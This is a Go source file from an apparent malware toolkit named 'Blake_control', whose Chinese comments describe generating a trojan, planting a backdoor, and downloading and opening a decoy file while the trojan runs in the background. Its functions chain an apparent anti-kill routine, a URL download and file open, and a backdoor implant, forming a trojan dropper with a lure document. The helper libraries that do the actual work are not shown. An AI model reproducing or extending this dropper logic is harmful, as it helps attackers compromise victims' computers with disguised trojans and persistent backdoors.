package generate

import (
	"Blake_control/mylib"
	"Blake_control/operation"
)

//只生成木马
func Onlymuma() {
	mylib.Notkill()
}

//只植入成后门
func Onlybackdoor(url string, path string) {
	//后门
	operation.Bakedoor(url, path)
}

//生成木马并弹出文件
func Tnuma(url string, path string) {
	//执行木马程序
	go func() {
		//执行木马程序
		mylib.Notkill()
		//执行完成之后正常暂停
		mylib.Stop()
	}()
	//下载要弹出的文件
	mylib.DownloadFile(url, path)
	//打开文件
	mylib.Openfile(path)
	//死循环防止go协程死亡
	select {}
}

//生成木马弹出文件植入后门
func MTZmuma(url string, path string, url1 string, path1 string) {
	//执行木马程序
	go func() {
		//执行木马程序
		mylib.Notkill()
		//执行完成之后正常暂停
		mylib.Stop()
	}()
	//下载要弹出的文件
	mylib.DownloadFile(url, path)
	//打开文件
	mylib.Openfile(path)
	//后门
	operation.Bakedoor(url1, path1)
	//死循环防止go协程死亡
	select {}
}
